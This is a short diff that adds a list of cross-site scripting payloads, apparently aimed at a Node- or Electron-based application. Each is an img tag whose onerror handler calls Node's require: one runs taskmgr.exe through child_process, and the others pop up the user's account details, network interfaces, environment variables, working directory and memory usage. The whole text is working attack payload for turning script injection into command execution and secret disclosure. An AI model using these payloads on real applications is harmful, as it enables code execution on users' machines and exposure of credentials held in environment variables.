@@ -1,1 +1,19 @@
 <img src=x onerror="require('child_process').execFile('taskmgr.exe', (err, stdout, stderr) => { if (err) alert('Error: ' + err.message); else if (stderr) alert('Stderr: ' + stderr); else alert('Stdout: ' + stdout); });">
+
+
+
+<img src=x onerror="alert(require('os').platform());">
+
+
+<img src=x onerror="alert(JSON.stringify(require('os').userInfo()));">
+
+
+<img src=x onerror="alert(JSON.stringify(require('os').networkInterfaces()));">
+
+
+<img src=x onerror="alert(JSON.stringify(process.env));">
+
+<img src=x onerror="alert(process.cwd());">
+
+<img src=x onerror="alert(JSON.stringify(process.memoryUsage()));">
+
